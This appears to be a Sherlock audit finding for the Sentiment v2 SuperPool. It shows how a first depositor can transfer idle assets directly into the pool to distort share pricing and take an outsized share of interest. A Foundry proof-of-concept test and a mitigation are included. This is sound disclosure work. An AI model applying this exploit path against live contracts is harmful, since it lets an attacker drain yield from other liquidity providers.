Mammoth Oily Tadpole

Medium

# Users exploiting idle assets will unfairly boost interest earnings, disadvantaging other liquidity providers.

### Summary

Direct asset transfers to  `superPool` will cause an inflated share distribution for users as they will acquire asset shares without those assets being utilized in the lending pools. This creates an imbalance in the system, where these assets do not contribute to the pool's overall liquidity but still grant the user an equivalent amount of shares. As a result, the user gains a larger portion of the pool's earnings relative to other depositors, who contribute to liquidity but receive fewer shares. 

### Root Cause

The root cause of the issue is that when a user transfers assets directly to the superPool, these assets are not actively used for lending or generating returns. Instead, they remain idle in the superPool and do not contribute to the pool's overall lending liquidity. Despite this, the system counts these idle assets when calculating the user's share of the pool’s interest.

https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/SuperPool.sol#L181C26-L181C31

### Internal pre-conditions

1. Attacker  (Liquidity Provider) needs to be the first user to deposit to the SuperPool to ensure that their initial deposits is not shared with any other depositors.


### External pre-conditions

_No response_

### Attack Path

## case 1 
1. Deploy `SuperPool`: The malicious actor deploys a new SuperPool contract. (poolOwner = malicious actor)

2. Initial Deposit: The attacker, being the first user to interact with the SuperPool, deposits an initial amount of assets,  This deposit is used to supply the pools

3. Direct Transfer of Assets: The attacker directly transfers additional assets to the SuperPool, bypassing the standard deposit mechanism. These assets remain idle within the SuperPool and do not contribute to the overall liquidity or get lent out.

4. Accrue Interest: The attacker calls the accrue() function, which calculates and distributes interest based on the total assets in the SuperPool, including both the initial deposit and the idle assets.

5. Additional Deposits : Other users may deposit assets into the pool. These deposits are calculated against the inflated total asset count, resulting in the other users receiving fewer shares than they would if the pool's asset total reflected only the actively used liquidity.

6. Attacker Gains More Interest: The attacker benefits from the increased share of the accrued interest because the idle assets are counted in the total asset calculation, even though they do not contribute to the lending activities. This manipulation allows the attacker to earn disproportionately more interest while their funds remain idle and unutilized.

## case 2

 if an attacker is not the deployer of the `SuperPool`, they can still exploit the system by frontrunning transactions or by closely monitoring new pools to be the first to perform certain actions. This allows the attacker to gain an advantage even without having initial control over the `SuperPool`.

### Impact

* Unfair Distribution of Interest: The attacker receives a disproportionate share of the accrued interest because the idle assets they deposited directly inflate the total asset count. This means the attacker earns more interest compared to other users who have deposited assets that are actively used for lending.
* Malicious user can drastically increase the minimum deposit needed to get shares in the superpool, which can prevent smaller players from contributing and decrease overall liquidity.
* Since the idle assets are not being used for lending, the attacker avoids the risks associated with lending activities benefit from the interest earnings while keeping their assets unutilized.


### PoC

```solidity
// run in superPool.t.sol
function testInflatedShareEarnings() public {
        // Setup pools in SuperPool
        vm.startPrank(poolOwner);
        superPool.addPool(linearRatePool, 2000 ether);
        superPool.addPool(fixedRatePool, 2000 ether);
        vm.stopPrank();

        // Attacker interaction with the pool
        address tom = vm.addr(100);
        vm.startPrank(tom);
        asset1.mint(tom, 1100 ether);
        
        // Deposit 100 ether assets into the pool
        asset1.approve(address(superPool), 100 ether);
        superPool.deposit(100 ether, tom);
        
        // Send 1000 ether as idle assets to the SuperPool
        asset1.transfer(address(superPool), 1000 ether);
        
        // Record tom's assets before interest accrual
        // tom is the malicios user
        // tom assets is 1100 ether - fee (fee go to tom if he is the poolOwner)
        uint256 tomAssetsBefore = superPool.previewRedeem(superPool.balanceOf(tom));
        vm.stopPrank();
        
        // Legitimate user deposits into the pool
        address alice = vm.addr(102);
        vm.startPrank(alice);
        asset1.mint(alice, 100 ether);
        asset1.approve(address(superPool), 100 ether);
        
        // Alice's funds will be used in lending operation
        superPool.deposit(100 ether, alice);
        uint256 aliceAssetsBefore = superPool.previewRedeem(superPool.balanceOf(alice));
        vm.stopPrank();

        // Lending operation
        address bob = vm.addr(103);
        vm.startPrank(Pool(pool).positionManager());
        // Expect revert if trying to borrow more than available liquidity
        vm.expectRevert();
        Pool(pool).borrow(linearRatePool, bob, 201 ether);

        Pool(pool).borrow(linearRatePool, bob, 200 ether); // Pool has 200 ether liquidity
       
        vm.stopPrank();

        // Accrue interest in the lending pool
        vm.warp(block.timestamp + 30 days);
        vm.roll(block.number + 1_000_000);
        pool.accrue(linearRatePool);

        // Bob repays the debt
        vm.startPrank(Pool(pool).positionManager());
        uint256 borrowsOwed = pool.getBorrowsOf(linearRatePool, bob);
        uint256 interest = borrowsOwed - 200 ether;
        asset1.mint(Pool(pool).positionManager(), borrowsOwed);
        asset1.transfer(address(pool), borrowsOwed);
        Pool(pool).repay(linearRatePool, bob, borrowsOwed);
        vm.stopPrank();
        
        // Accrue interest in SuperPool
        superPool.accrue();

        // Output shares and validate
        uint256 tomShares = superPool.balanceOf(tom);
        uint256 aliceShares = superPool.balanceOf(alice);

        console2.log("Tom's shares: ", tomShares);
        console2.log("Alice's shares: ", aliceShares);

        // Validate expected shares
        assertEq(tomShares, 100 ether);
        // Alice’s shares should be significantly less than Tom’s
        // Expect Alice’s shares to be approximately 10x less than Tom’s
        assertLe(aliceShares, 10 ether);

        // Calculate TOm's and Alice's interest earned
        uint256 tomInterestEarned = superPool.previewRedeem(superPool.balanceOf(tom)) - tomAssetsBefore;
        uint256 aliceInterestEarned = superPool.previewRedeem(superPool.balanceOf(alice)) - aliceAssetsBefore;
        console2.log("Tom's interest earned: ", tomInterestEarned);
        console2.log("Alice's interest earned: ", aliceInterestEarned);

        // Assert interest earned is within expected range
        assertGt(tomInterestEarned, 29 ether);
        assertLe(aliceInterestEarned, 3 ether);

        // Log total interest earned in the lending pool
        console2.log("Total interest: ", interest);
    }
```

### Mitigation

ensure that any assets held by the `SuperPool` are distributed to the  pools if their total exceeds a specified threshold when the accrue function is called . This approach prevents assets from remaining idle and ensures that they contribute to the liquidity of the pools
